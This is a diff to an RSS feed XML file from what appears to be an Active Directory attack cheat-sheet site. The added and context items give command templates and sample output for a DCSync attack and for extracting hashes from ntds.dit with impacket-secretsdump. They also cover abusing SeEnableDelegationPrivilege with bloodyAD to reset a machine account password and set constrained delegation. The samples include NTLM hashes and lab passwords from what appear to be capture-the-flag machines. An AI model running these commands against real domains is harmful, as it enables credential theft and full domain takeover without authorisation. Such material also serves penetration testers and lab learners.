@@ -22,5 +22,19 @@
       <guid>https://tldrbins.github.io/getchanges_getchangesall/</guid>
       <description>Abuse #1: DCSync Attack Linux Windows # With creds impacket-secretsdump -just-dc &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; $ impacket-secretsdump -just-dc &amp;#39;mrlky:Football#7@10.10.10.103&amp;#39; Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8::: ---[SNIP]--- [*] Cleaning up... # With hashes impacket-secretsdump -hashes :&amp;lt;HASH&amp;gt; -just-dc &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; $ impacket-secretsdump -hashes :bceef4f6fe9c026d1d8dec8dce48adef -just-dc &amp;#39;sizzle.htb/mrlky@10.10.10.103&amp;#39; Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.</description>
     </item>
+    <item>
+      <title>secretsdump</title>
+      <link>https://tldrbins.github.io/secretsdump/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/secretsdump/</guid>
+      <description>Convert ntds.dit to .sqlite ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite Ref: ntdsdotsqlite&#xA;With ntds.dit and SYSTEM hive impacket impacket-secretsdump -ntds ntds.dit -system system LOCAL $ impacket-secretsdump -ntds ntds.dit -system system LOCAL Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d::: ---[SNIP]--- [*] Cleaning up.</description>
+    </item>
+    <item>
+      <title>SeEnableDelegationPrivilege</title>
+      <link>https://tldrbins.github.io/seenabledelegationprivilege/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/seenabledelegationprivilege/</guid>
+      <description>Abuse #1: Constrained Delegation Linux Windows 1. Control of a Machine Account bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; set password &amp;#39;&amp;lt;TARGET_MACHINE&amp;gt;$&amp;#39; &amp;#39;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39; $ bloodyAD -d REDELEGATE.VL -u &amp;#39;HELEN.FROST&amp;#39; -p &amp;#39;Fall2024!&amp;#39; --host DC.REDELEGATE.VL set password &amp;#39;FS01$&amp;#39; &amp;#39;Fall2024!&amp;#39; [+] Password changed successfully! 2. Set msDS-AllowedToDelegateTo to Target SPN bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; set object &amp;#39;CN=&amp;lt;TARGET_MACHINE&amp;gt;,CN=COMPUTERS,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;msDS-AllowedToDelegateTo&amp;#39; -v &amp;#39;ldap/&amp;lt;DC&amp;gt;&amp;#39; $ bloodyAD -u &amp;#39;HELEN.FROST&amp;#39; -p &amp;#39;Fall2024!&amp;#39; -d &amp;#39;REDELEGATE.</description>
+    </item>
   </channel>
 </rss>
